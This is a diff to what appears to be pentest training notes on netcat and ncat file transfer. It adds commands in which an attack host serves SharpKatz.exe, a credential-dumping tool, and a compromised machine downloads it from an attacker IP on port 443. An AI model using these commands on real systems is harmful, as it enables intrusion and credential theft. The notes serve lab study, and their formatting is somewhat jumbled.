@@ -43,5 +43,16 @@ sudo nc -l -p 443 -q 0 < <FILE>
 
 #### Compromised machine connects to receive file
 ```bash
-nc <IP OF ATTACKER> <PORT> 
+nc <IP OF ATTACKER> <PORT> > <FILE>
 ```
+
+#### Attack Host - Sending File as Input to Ncat
+
+        shellsession
+`SonithGT@htb[/htb]$ # Example using Ncat SonithGT@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe
+```
+
+#### Compromised Machine Connect to Ncat to Receive the File
+
+        shellsession
+`victim@target:~$ # Example using Ncat victim@target:~$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe`
